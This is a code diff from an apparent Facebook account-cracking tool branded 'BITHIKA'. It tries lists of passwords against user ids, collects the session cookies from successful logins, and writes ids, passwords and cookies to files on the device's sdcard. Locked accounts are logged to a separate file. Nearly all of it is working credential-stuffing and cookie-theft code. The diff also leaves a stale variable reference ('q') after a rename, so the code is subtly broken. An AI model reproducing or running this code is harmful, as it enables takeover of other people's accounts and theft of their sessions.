@@ -1902,19 +1902,19 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             c.perform()
             c.close()
             po = buffer.getvalue().decode('utf-8')
-            q = json.loads(po)
+            load = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in load["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
-                oks.append(ids)
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                 open('/sdcard/BITHIKA-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                oks.append(ids)
                 break
-            elif "www.facebook.com" in q["error"]["message"]:
-                cps.append(ids)
+            elif "www.facebook.com" in load["error"]["message"]:
                 print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                cps.append(ids)
                 break
             else:
                 continue
